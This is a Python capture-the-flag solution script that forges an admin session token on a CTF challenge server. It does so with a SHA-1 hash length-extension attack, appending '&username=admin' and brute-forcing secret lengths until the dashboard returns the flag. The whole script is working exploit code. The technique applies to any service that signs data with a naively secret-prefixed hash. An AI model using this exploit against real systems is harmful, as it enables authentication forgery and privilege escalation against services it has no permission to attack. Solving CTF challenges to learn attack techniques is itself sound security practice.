#!/usr/bin/python2
# i'm a bit lazy so i just used an off-the-shelf hash extender library
import hlextend
import binascii
import requests
import re

INJECT = "&username=admin"
REGEX = r'[0-9a-f]{16,}\.[0-9a-f]+'
REGEX_FLAG = r'ATLASSIAN\{.*\}'

ENDPOINT = "https://qswt.atlassian-ctf.unswsecurity.com"

r = requests.get(ENDPOINT)

token = re.findall(REGEX, r.text)[0].encode('ascii', 'ignore')
encoded_data, encoded_digest = token.split('.')
data = encoded_data.decode('hex')



for i in range(1,33):
    sha = hlextend.new('sha1')
    extended = sha.extend(INJECT, data, i, encoded_digest, raw=True)
    digest = sha.hexdigest()
    
    print ENDPOINT + '/dashboard?qswt=' + extended.encode('hex') + '.' + digest
    r = requests.get(ENDPOINT + '/dashboard?qswt=' + extended.encode('hex') + '.' + digest)
    print(r.status_code)
    if r.status_code == 200:
        print(re.findall(REGEX_FLAG, r.text)[0])
